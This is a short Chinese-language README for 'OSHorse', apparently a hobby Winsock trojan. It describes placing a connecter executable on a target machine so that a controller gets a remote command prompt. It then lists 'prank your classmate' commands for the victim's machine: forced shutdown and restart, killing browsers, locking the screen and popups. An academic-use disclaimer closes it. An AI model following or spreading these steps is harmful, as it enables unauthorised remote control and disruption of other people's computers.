# OSHorse
特洛伊木马，winsock之TCP连接

## 使用方法
1. 在控制机器上下载`./HorseCommander/HorseCommander.exe`并打开
2. 在目标机器上下载`./connecter/connecter.exe`，并在程序同一目录下新建文本文档，内容为控制机器的IP地址。双击打开程序，目标机器可能会闪过一个黑框。
3. 回到控制机器，会显示连线者IP地址并显示提示符，您现在可以远程执行命令啦！

TIPS: 这个提示符的界面和cmd不一样，你可以执行`cd .`来查看目标机器上木马的工作目录，输入`help`查看木马内置命令。

坑同学小命令：
```cmd
#关机
shutdown -s -t [时间，单位为秒]
#重启
shutdown -r -t [时间，单位为秒]
#关闭chrome浏览器
taskkill -f -im chrome.exe
#关闭edge浏览器
taskkill -f -im msedge.exe
#弹出计算器
calc
#锁屏
lock
#弹窗
msg [消息]
```

### 免责声明：仅供学术研究使用。对于违反相关法律、造成危害的滥用行为，开发者不负任何责任。
